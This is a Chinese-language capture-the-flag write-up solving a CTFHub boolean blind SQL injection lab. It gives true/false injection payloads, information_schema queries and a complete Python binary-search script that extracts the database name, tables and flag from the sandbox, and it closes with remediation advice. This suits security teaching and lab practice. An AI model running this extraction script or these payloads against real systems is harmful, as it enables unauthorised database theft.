# CTFHub Writeup - 布尔盲注

## 题目类型

WEB

0x01 题目信息
项目	内容
题目名称	CTFHub 技能学习 - 布尔注入
靶场地址	
http://challenge-206ca5b4c1e7d725.sandbox.ctfhub.com:10800
注入参数	GET id
数据库	sqli
目标数据	sqli.flag.flag
判定特征	真 → query_success，假 → query_error
Flag	ctfhub{c0a70fdd10b7d806bff0119d}
0x02 漏洞原理
布尔盲注是 SQL 注入的一种「盲」利用方式。

它和报错注入最大的区别是：页面既不回显查询结果，也不回显数据库的报错内容，只会告诉你「这次查询有没有查到东西」。

本题就很典型。页面只输出两个结果：

代码块


query_success
query_error
看不到数据、看不到表名，甚至看不到 SQL 错误。攻击者唯一能拿到的，就是一个「是 / 否」的回答。

布尔盲注的核心思路

既然只能问「是 / 否」，那就把想拿的数据拆成一个个真假问题。

比如想知道数据库名的第一个字符是什么，可以这样问数据库：

sql


select ascii(substr(database(),1,1)) > 100
如果返回 query_success，说明第一个字符的 ASCII 码大于 100；返回 query_error，说明小于等于 100。

一次只能排除一半，所以用二分法：先问 > 64，再问 > 96，再问 > 112……七八次就能确定一个字符。字符确定后，把下标往后挪一位，继续问下一个字符。

关键函数

substr(str, pos, 1)：取字符串第 pos 个字符；

ascii(char)：取字符的 ASCII 码，方便做数值比较；

length(str)：取长度，先用它确定要循环多少次。

因为每个字符都要问好几次，手工点页面不现实，必须写脚本自动化。本题 flag 有 32 个字符，加上库名、表名、字段名，总共大约 350 次请求。

0x03 解题过程
3.1 找注入点

首页是一个查询框，GET 传参 id，输入 1 会返回：

代码块


select * from news where id=1
query_success
加一个单引号：

代码块


id=1'
代码块


query_error
说明单引号破坏了 SQL 语法，id 处存在注入。这里 id 是数字型，后续 payload 不用闭合引号。

3.2 确认布尔盲注

分别提交真条件和假条件：

代码块


id=1 and 1=1   -> query_success
id=1 and 1=2   -> query_error
真条件成功、假条件失败，而且页面不回显任何数据、也不回显 SQL 报错文本，这说明只能走布尔盲注，而不是联合查询或报错注入。

顺便注意：id=1 and sleep(0) 也返回 query_error，因为 sleep(0) 的值是 0，1 and 0 为假——说明本题连时间盲注都不好用，布尔判断是最稳的路子。

3.3 判断库名长度

先用 length() 问出数据库名的长度：

代码块


id=1 and length(database())>=1    -> query_success
id=1 and length(database())>=99   -> query_error
不断调整数字，二分几次后可以确定长度是 4。

3.4 逐字符猜库名

长度已知，开始逐位猜字符。以第 1 位为例：

代码块


id=1 and ascii(substr(database(),1,1))>64     -> query_success
id=1 and ascii(substr(database(),1,1))>96     -> query_success
id=1 and ascii(substr(database(),1,1))>112    -> query_error
在 96 和 112 之间继续二分，最终确定 ASCII 码为 115，也就是字符 s。

把下标从 1 到 4 依次跑完，得到库名：

代码块


sqli
3.5 爆表名和字段名

有了库名，用同样的方法问 information_schema。表名用 group_concat() 拼成一个字符串，再逐字符猜：

sql


select group_concat(table_name)
from information_schema.tables
where table_schema=database()
最终得到：

代码块


flag,news
显然目标是 flag 表。继续问字段名：

sql


select group_concat(column_name)
from information_schema.columns
where table_schema=database() and table_name='flag'
得到字段名也是 flag。

3.6 取出 flag

最后对 select flag from flag 的返回值逐字符猜。完整脚本如下，核心就是三个函数：cond() 发请求判断真假，char_at() 二分猜字符，dump() 循环取整串。

python


import urllib.parse, urllib.request

BASE = "http://challenge-206ca5b4c1e7d725.sandbox.ctfhub.com:10800/"

def cond(expr):
    url = BASE + "?" + urllib.parse.urlencode({"id": "1 and (%s)" % expr})
    body = urllib.request.urlopen(url, timeout=20).read().decode()
    return "query_success" in body

def length_of(expr):
    lo, hi = 0, 128
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond("length((%s))>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo

def char_at(expr, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if cond("ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def dump(expr):
    return "".join(char_at(expr, i) for i in range(1, length_of(expr) + 1))

print(dump("database()"))
print(dump("(select group_concat(table_name) from information_schema.tables "
           "where table_schema=database())"))
print(dump("(select flag from flag limit 0,1)"))

sqli
flag,news
ctfhub{c0a70fdd10b7d806bff0119d}
3.7 验证

为了确认不是脚本拼错，把猜出来的值直接放进一个等式条件里再问一次：

代码块


id=1 and (select flag from flag)='ctfhub{c0a70fdd10b7d806bff0119d}'   -> query_success
id=1 and (select flag from flag)='ctfhub{c0a70fdd10b7d806bff0119e}'   -> query_error
只有完全一致时才返回成功，说明 flag 正确。

0x04 完整流程
步骤	判断语句	结果
库名长度	length(database())>=n	4
库名	ascii(substr(database(),i,1))>n	sqli
表名	group_concat(table_name) 逐字符	flag,news
字段名	group_concat(column_name) 逐字符	flag
flag	ascii(substr((select flag from flag),i,1))>n	ctfhub{c0a70fdd10b7d806bff0119d}
整个链路可以概括成一句话：用 length() 定长度，用 substr() 定位，用 ascii() 转数字，用二分法把「猜字符」压缩到七八次请求。

0x05 踩坑记录
1.空结果也算 error：id=1 and 1=2 的 SQL 本身执行成功，只是没有结果集，但页面依然返回 query_error。所以要区分「SQL 报错」和「查不到数据」——本题恰恰是利用了后者做判定。

2.数字型不要画蛇添足：本题 id 没有引号包裹，直接写 1 and ... 即可。照抄字符型的 1' and ... 会多出一个引号，整条 payload 直接语法错误。

3.二分边界要写对：ASCII 可见字符范围取 32–126，循环条件用 > 配合 lo = mid + 1 / hi = mid，否则容易少猜一位或死循环。

4.先定长度再逐字符：不先问 length() 就得猜一个很大的上限，浪费大量请求；有了长度，循环次数正好。

5.请求要加重试：几百次请求里偶尔会超时或连接被重置，try/except 加重试比直接崩溃好；每次请求间隔别太小，避免被 WAF 或限流拦掉。

6.group_concat 默认逗号分隔：拿到 flag,news 后按逗号切分即可；数据多时注意默认 1024 字节的长度限制。

7.不要迷信时间盲注：本题 sleep(0) 会让条件变成假，时间盲注的判定容易和布尔判定混在一起，直接走布尔更干净。

0x06 修复建议
1.使用预编译（参数化查询）：PDO 的 prepare/execute 或 mysqli 预处理，把 id 作为参数绑定，注入从根上消失。

2.对输入做类型校验：id 应该是整数，用 intval() 强转或正则限制为纯数字。

3.不要用「有无结果」直接暴露给用户：空结果和出错都统一返回同一个页面，避免攻击者拿到稳定的布尔判定。

4.关闭详细报错：display_errors=Off，数据库错误写日志，不回显给前端。

5.最小权限：Web 应用不要用 root 连库，只授予业务所需的 SELECT 权限。

6.WAF 兜底：对 and、substr、ascii、information_schema 等关键字做拦截，但只能作为补充手段。

0x07 总结
布尔盲注是「盲注」里最基础的一种：页面什么都不告诉你，只回答「是 / 否」。

解题的关键不是构造多复杂的语句，而是把「读数据」转化成「问问题」——先用 length() 问长度，再用 substr() + ascii() 把字符转成数字，最后用二分法快速逼近答案。

本题 flag 只有 32 个字符，但背后的请求量已经接近 350 次，手工点根本不现实。这也说明：盲注的本质是自动化，脚本写对了，剩下的只是等它跑完。
